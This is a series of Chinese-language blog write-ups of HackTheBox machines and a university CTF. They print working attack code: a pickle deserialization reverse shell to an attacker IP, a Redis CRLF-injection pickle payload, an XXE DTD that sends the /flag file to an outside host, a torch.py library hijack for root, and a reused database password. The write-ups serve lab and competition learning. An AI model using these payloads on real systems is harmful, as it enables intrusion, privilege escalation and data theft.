<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> clearml <span class="keyword">import</span> Task</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunCommand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.22/1028 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">command = RunCommand()</span><br><span class="line"></span><br><span class="line">task = Task.init(project_name=<span class="string">&#x27;Black Swan&#x27;</span>, task_name=<span class="string">&#x27;pickle_artifact_upload&#x27;</span>, tags=[<span class="string">&quot;review&quot;</span>])</span><br><span class="line">task.upload_artifact(name=<span class="string">&#x27;pickle_artifact&#x27;</span>, artifact_object=command, retries=<span class="number">2</span>, wait_on_upload=<span class="literal">True</span>, extension_name=<span class="string">&quot;.pkl&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>把exp放到和<code>clearml.conf</code>文件同一目录下，运行发现报错</p>
<p><img src="/article/Blurry/image-20240901192944222.png"></p>
<p>这里网上搜了下应该是urllib3版本问题，尝试升级</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install --upgrade urllib3</span><br></pre></td></tr></table></figure>

<p>不过还是不行，还可以试试python的venv模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install virtualenv</span><br><span class="line">virtualenv venv                #创建venv文件夹</span><br><span class="line">source venv/bin/activate       #进入虚拟环境</span><br><span class="line">pip install clearml</span><br></pre></td></tr></table></figure>

<p><img src="/article/Blurry/image-20240901193604495.png"></p>
<p>安装成功后，监听1028端口然后执行payload</p>
<p><img src="/article/Blurry/image-20240901193721425.png"></p>
<p>我们也可以看看实验是否在运行</p>
<p><img src="/article/Blurry/image-20240901192013689.png"></p>
<p>等实验运行完就可以收到反弹的shell，拿到user的flag</p>
<p><img src="/article/Blurry/image-20240901194034377.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试sudo提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/article/Blurry/image-20240901194121364.png"></p>
<p>我们看下<code>/usr/bin/evaluate_model</code>具体执行内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># Evaluate a given model against our proprietary dataset.</span><br><span class="line"># Security checks against model file included.</span><br><span class="line"></span><br><span class="line">if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">    /usr/bin/echo &quot;Usage: $0 &lt;path_to_model.pth&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">MODEL_FILE=&quot;$1&quot;</span><br><span class="line">TEMP_DIR=&quot;/opt/temp&quot;</span><br><span class="line">PYTHON_SCRIPT=&quot;/models/evaluate_model.py&quot;  </span><br><span class="line"></span><br><span class="line">/usr/bin/mkdir -p &quot;$TEMP_DIR&quot;</span><br><span class="line"></span><br><span class="line">file_type=$(/usr/bin/file --brief &quot;$MODEL_FILE&quot;)</span><br><span class="line"></span><br><span class="line"># Extract based on file type</span><br><span class="line">if [[ &quot;$file_type&quot; == *&quot;POSIX tar archive&quot;* ]]; then</span><br><span class="line">    # POSIX tar archive (older PyTorch format)</span><br><span class="line">    /usr/bin/tar -xf &quot;$MODEL_FILE&quot; -C &quot;$TEMP_DIR&quot;</span><br><span class="line">elif [[ &quot;$file_type&quot; == *&quot;Zip archive data&quot;* ]]; then</span><br><span class="line">    # Zip archive (newer PyTorch format)</span><br><span class="line">    /usr/bin/unzip -q &quot;$MODEL_FILE&quot; -d &quot;$TEMP_DIR&quot;</span><br><span class="line">else</span><br><span class="line">    /usr/bin/echo &quot;[!] Unknown or unsupported file format for $MODEL_FILE&quot;</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">/usr/bin/find &quot;$TEMP_DIR&quot; -type f \( -name &quot;*.pkl&quot; -o -name &quot;pickle&quot; \) -print0 | while IFS= read -r -d $&#x27;\0&#x27; extracted_pkl; do</span><br><span class="line">    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 &quot;$extracted_pkl&quot;)</span><br><span class="line"></span><br><span class="line">    if /usr/bin/echo &quot;$fickling_output&quot; | /usr/bin/jq -e &#x27;select(.severity == &quot;OVERTLY_MALICIOUS&quot;)&#x27; &gt;/dev/null; then</span><br><span class="line">        /usr/bin/echo &quot;[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted.&quot;</span><br><span class="line">        /bin/rm &quot;$MODEL_FILE&quot;</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">/usr/bin/find &quot;$TEMP_DIR&quot; -type f -exec /bin/rm &#123;&#125; +</span><br><span class="line">/bin/rm -rf &quot;$TEMP_DIR&quot;</span><br><span class="line"></span><br><span class="line">if [ -f &quot;$MODEL_FILE&quot; ]; then</span><br><span class="line">    /usr/bin/echo &quot;[+] Model $MODEL_FILE is considered safe. Processing...&quot;</span><br><span class="line">    /usr/bin/python3 &quot;$PYTHON_SCRIPT&quot; &quot;$MODEL_FILE&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>赋值变量，对文件进行审查。最后就是执行<code>/usr/bin/python3 &quot;$PYTHON_SCRIPT&quot; &quot;$MODEL_FILE&quot;</code>命令，往上看发现分别是<code>/model</code>下的两个文件</p>
<p><img src="/article/Blurry/image-20240901195819905.png"></p>
<p>跟进一下<code>evaluate_model.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"><span class="keyword">from</span> torchvision.datasets <span class="keyword">import</span> CIFAR10</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader, Subset</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomCNN</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(CustomCNN, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">3</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">16</span>, out_channels=<span class="number">32</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>, padding=<span class="number">0</span>)</span><br><span class="line">        self.fc1 = nn.Linear(in_features=<span class="number">32</span> * <span class="number">8</span> * <span class="number">8</span>, out_features=<span class="number">128</span>)</span><br><span class="line">        self.fc2 = nn.Linear(in_features=<span class="number">128</span>, out_features=<span class="number">10</span>)</span><br><span class="line">        self.relu = nn.ReLU()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.pool(self.relu(self.conv1(x)))</span><br><span class="line">        x = self.pool(self.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">32</span> * <span class="number">8</span> * <span class="number">8</span>)</span><br><span class="line">        x = self.relu(self.fc1(x))</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_model</span>(<span class="params">model_path</span>):</span><br><span class="line">    model = CustomCNN()</span><br><span class="line">    </span><br><span class="line">    state_dict = torch.load(model_path)</span><br><span class="line">    model.load_state_dict(state_dict)</span><br><span class="line">    </span><br><span class="line">    model.<span class="built_in">eval</span>()  </span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_dataloader</span>(<span class="params">batch_size=<span class="number">32</span></span>):</span><br><span class="line">    transform = transforms.Compose([</span><br><span class="line">        transforms.RandomHorizontalFlip(),</span><br><span class="line">        transforms.RandomCrop(<span class="number">32</span>, padding=<span class="number">4</span>),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize(mean=[<span class="number">0.4914</span>, <span class="number">0.4822</span>, <span class="number">0.4465</span>], std=[<span class="number">0.2023</span>, <span class="number">0.1994</span>, <span class="number">0.2010</span>]),</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line">    dataset = CIFAR10(root=<span class="string">&#x27;/root/datasets/&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">False</span>, transform=transform)</span><br><span class="line">    subset = Subset(dataset, indices=np.random.choice(<span class="built_in">len</span>(dataset), <span class="number">64</span>, replace=<span class="literal">False</span>))</span><br><span class="line">    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> dataloader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evaluate_model</span>(<span class="params">model, dataloader</span>):</span><br><span class="line">    correct = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():  </span><br><span class="line">        <span class="keyword">for</span> images, labels <span class="keyword">in</span> dataloader:</span><br><span class="line">            outputs = model(images)</span><br><span class="line">            _, predicted = torch.<span class="built_in">max</span>(outputs.data, <span class="number">1</span>)</span><br><span class="line">            total += labels.size(<span class="number">0</span>)</span><br><span class="line">            correct += (predicted == labels).<span class="built_in">sum</span>().item()</span><br><span class="line">    </span><br><span class="line">    accuracy = <span class="number">100</span> * correct / total</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Accuracy of the model on the test dataset: <span class="subst">&#123;accuracy:<span class="number">.2</span>f&#125;</span>%&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">model_path</span>):</span><br><span class="line">    model = load_model(model_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Loaded Model.&quot;</span>)</span><br><span class="line">    dataloader = prepare_dataloader()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Dataloader ready. Evaluating model...&quot;</span>)</span><br><span class="line">    evaluate_model(model, dataloader)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python script.py &lt;path_to_model.pth&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        model_path = sys.argv[<span class="number">1</span>]  <span class="comment"># Path to the .pth file</span></span><br><span class="line">        main(model_path)</span><br></pre></td></tr></table></figure>

<p>注意到有导入torch库，并且该文件夹具有写权限</p>
<p><img src="/article/Blurry/image-20240901234440204.png"></p>
<p>尝试创建同名py文件劫持torch库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27; &gt; torch.py</span><br><span class="line">sudo /usr/bin/evaluate_model /models/demo_model.pth</span><br></pre></td></tr></table></figure>

<p>成功提权拿到root的flag</p>
<p><img src="/article/Blurry/image-20240901235511794.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>漏洞利用</p>
<ul>
<li><a href="https://medium.com/@vishalchaudharydevsec/hacking-clearml-using-malicious-pickle-file-upload-pickle-deserialization-41182d731cd2">https://medium.com/@vishalchaudharydevsec/hacking-clearml-using-malicious-pickle-file-upload-pickle-deserialization-41182d731cd2</a></li>
</ul>
<p>Linux搭建python虚拟环境</p>
<ul>
<li><a href="http://kuanghy.github.io/2015/12/04/virtualenv">http://kuanghy.github.io/2015/12/04/virtualenv</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>高校网络安全管理运维赛2024</title>
    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web.html</url>
    <content><![CDATA[<p>代表福师大参加运维赛，还好最后十分钟解出来pyssrf拿了个华南赛区二等</p>
<span id="more"></span>



<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h2><p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">from redis import Redis</span><br><span class="line">import hashlib</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=&#x27;127.0.0.1&#x27;, port=6379)</span><br><span class="line"></span><br><span class="line">def get_result(url):</span><br><span class="line">    url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">    res=redis.get(url_key)</span><br><span class="line">    if res:</span><br><span class="line">        return pickle.loads(base64.b64decode(res))</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            print(url)</span><br><span class="line">            info = urllib.request.urlopen(url)</span><br><span class="line">            res = info.read()</span><br><span class="line">            pickres=pickle.dumps(res)</span><br><span class="line">            b64res=base64.b64encode(pickres)</span><br><span class="line">            redis.set(url_key,b64res,ex=300)</span><br><span class="line">            return res</span><br><span class="line">        except urllib.error.URLError as e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    return &#x27;&#x27;&#x27;&lt;h1&gt;give me your url via GET method like: ?url=127.0.0.1:8080&lt;h1&gt;</span><br><span class="line">    &lt;h2&gt;Here is your result&lt;/h2&gt;</span><br><span class="line">    &lt;h3&gt;source code in /source&lt;/h3&gt;</span><br><span class="line">    %s</span><br><span class="line">    &#x27;&#x27;&#x27; % get_result(&#x27;http://&#x27;+url).decode(encoding=&#x27;utf8&#x27;,errors=&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/source&#x27;)</span><br><span class="line">def source():</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>

<p>分析源码，注意到<code>get_result()</code>函数有pickle反序列化</p>
<p>往前分析，前提是在连接redis的时候需要匹配到url_key键名</p>
<p>并且注意到存在urllib头部注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info = urllib.request.urlopen(url)</span><br></pre></td></tr></table></figure>

<p><strong>思路</strong></p>
<blockquote>
<p>先访问url生成键名，然后利用urllib头部注入设置该键名值为pickle的payload，最后再访问该键名（也就是<code>127.0.0.1:6379</code>）</p>
</blockquote>
<p>我们先访问在题目生成键名（这里对应的是<code>http:127.0.0.1:6379</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379</span><br></pre></td></tr></table></figure>

<p>然后在本地运行脚本生成对应MD5值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import hashlib</span><br><span class="line">from flask import Flask,request</span><br><span class="line">url=&#x27;http://127.0.0.1:6379&#x27;</span><br><span class="line">url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">print(url_key)</span><br></pre></td></tr></table></figure>

<p>利用报错回显，pickle反序列化exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">class A():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;,))</span><br><span class="line"> </span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>

<p>然后利用urllib头部注入修改前面键名的值为payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379?</span><br><span class="line">set cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>丢到cyberchef编码一下</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506213415136.png"></p>
<p>直接传payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379?%0d%0aset cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=%0d%0asave</span><br></pre></td></tr></table></figure>

<p>然后再访问<code>127.0.0.1:6379</code>就可以看到修改后的flag</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506205730515.png"></p>
<h2 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h2><blockquote>
<p>xxe无回显</p>
</blockquote>
<p>bp抓包修改POST请求方式，添加数据（注意content-type为xml）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &#x27;http://5i781963p2.yicp.fun:80/test.dtd&#x27;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194841777.png"></p>
<p>test.dtd文件（注意<code>%</code>要改成<code>&amp;#37;</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://5i781963p2.yicp.fun:80?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>本地开启http服务，成功外带flag</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194620542.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>打开附件，筛选一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==192.168.33.102</span><br></pre></td></tr></table></figure>

<p>追踪tcp流，发现具有冰蝎流量的特征</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506225011235.png"></p>
<p>导出http对象，保存到本地</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225053452.png"></p>
<p>将shell.php内容丢到<a href="http://tools.bugscaner.com/cryptoaes/">在线网站</a>解密，这里密钥就直接猜默认密钥</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506224735752.png"></p>
<p>在第十个shell.php进行解密后再base64两次发现是PK头</p>
<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506225825504.png"></p>
<p>保存为zip文件后爆破密码<code>A8s123/+*</code>，解压后得到flag</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>pickle反序列化</tag>
        <tag>CRLF</tag>
      </tags>
  </entry>
  <entry>
    <title>BoardLight</title>
    <url>/article/BoardLight-HackTheBox.html</url>
    <content><![CDATA[<p>Dolibarr 代码执行漏洞、Enlightenment组件权限提升漏洞</p>
<span id="more"></span>

<h1 id="BoardLight"><a href="#BoardLight" class="headerlink" title="BoardLight"></a>BoardLight</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.11</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<p>80端口有http服务并且为apache中间件，尝试访问一下</p>
<p><img src="/article/BoardLight-HackTheBox/image-20240530212903125.png"></p>
<p>拉到最下面得到域名信息<code>board.htb</code>，添加到hosts文件中成功访问</p>
<p>爆破下子域名，得到<code>crm.board.htb</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://board.htb/ -w /home/rev1ve/shentou/dict/zi-yu-ming/subdomains-10000.txt --append-domain</span><br></pre></td></tr></table></figure>

<p><img src="/article/BoardLight-HackTheBox/image-20240530214310012.png"></p>
<p>同理添加到hosts文件即可访问，注意到<code>Dolibarr 17.0.0</code></p>
<p>不过大部分漏洞都要登录到后台界面才能利用，猜测存在admin用户</p>
<p>burpsuite爆破密码得到admin，直接进行登录</p>
<p><img src="/article/BoardLight-HackTheBox/image-20240530225345286.png"></p>
<p>去阿里云漏洞库搜索，可利用漏洞如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2023-4197: Dolibarr ERP CRM (&lt;= 18.0.1) 不正确的输入清理验证 RCE</span><br><span class="line">CVE-2023-38888: Dolibarr ERP CRM 中的跨站脚本漏洞</span><br><span class="line">CVE-2023-4198: Dolibarr ERP CRM (&lt;= 17.0.3) 访问控制不当</span><br><span class="line">CVE-2023-30253: Dolibarr 代码执行漏洞</span><br><span class="line">CVE-2023-38886: Dolibarr 允许远程特权攻击者通过精心设计的命令/脚本执行任意代码</span><br><span class="line">CVE-2023-38887: Dolibarr ERP CRM 中的文件上传漏洞</span><br><span class="line">CVE-2023-5323: 跨站脚本 (XSS) - dolibarr/dolibarr 中的通用</span><br><span class="line">CVE-2024-23817: Dolibarr 应用程序主页 HTML 注入漏洞</span><br><span class="line">CVE-2024-29477: Dolibarr ERP CRM 安装过程中的代码注入漏洞</span><br><span class="line">CVE-2024-31503: Dolibarr 容易遭受跨站请求伪造</span><br></pre></td></tr></table></figure>

<p>CVE-2023-4197、CVE-2023-4198利用失败</p>
<p>在测试CVE-2023-30253的时候搜到网上现成的poc <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">脚本链接</a></p>
<p>直接反弹shell到本机</p>
<p><img src="/article/BoardLight-HackTheBox/image-20240530231214626.png"></p>
<p>经过一番查找，在<code>~/html/crm.board.htb/htdocs/conf</code>路径下找到敏感文件conf.php</p>
<p><img src="/article/BoardLight-HackTheBox/image-20240601102008593.png"></p>
<p>这里要先提升为完全交互式shell，不然后面连接数据库输入密码没反应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>尝试本地mysql登录，密码为<code>serverfun2$2023!!</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u dolibarrowner -p -h localhost</span><br></pre></td></tr></table></figure>

<p>连接成功后找到表<code>llx_user</code>，查询用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select login,pass_crypted from llx_user;</span><br></pre></td></tr></table></figure>

<p>查询结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| login    | pass_crypted                                                 |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |</span><br><span class="line">| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>不过用john都爆不出来，私钥文件也找不到</p>
<p>之前有在<code>/home</code>下看到larissa用户，尝试用上面得到的数据库密码去ssh连接</p>
<p>拿到user的flag</p>
<p><img src="/article/BoardLight-HackTheBox/image-20240601111112563.png"></p>
<p>经过一番查找，发现常见的提权方式比如sudo都不太行</p>
<p>于是上传linpeas去自动化探测漏洞（在本机开启http服务）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.88/linpeas.sh</span><br></pre></td></tr></table></figure>

<p>然后chmod给个执行权限直接执行</p>
<p>发现存在0.23.1版本的enlightenment组件</p>
<p><img src="/article/BoardLight-HackTheBox/image-20240601220215406.png"></p>
<p>网上搜索找到利用enlightenment_sys二进制文件去权限提升的洞 <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">参考文章</a></p>
<p><strong>Enlightenment组件权限提升漏洞</strong></p>
<blockquote>
<p>Enlightenment 0.25.4之前版本中的enlightenment_sys允许本地用户获得特权，因为它是setuid root，并且系统库函数错误处理以&#x2F;dev&#x2F;.开始的路径名</p>
</blockquote>
<p>用参考文章的exp打就行，得到root的flag</p>
<p><img src="/article/BoardLight-HackTheBox/image-20240601220653063.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>Brutus</title>
    <url>/article/Brutus-HackTheBox.html</url>
    <content><![CDATA[<p>wtmp日志文件</p>
<span id="more"></span>

<h1 id="Brutus"><a href="#Brutus" class="headerlink" title="Brutus"></a>Brutus</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
</blockquote>
<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
<p>我们在对成功登录的日志记录下来</p>
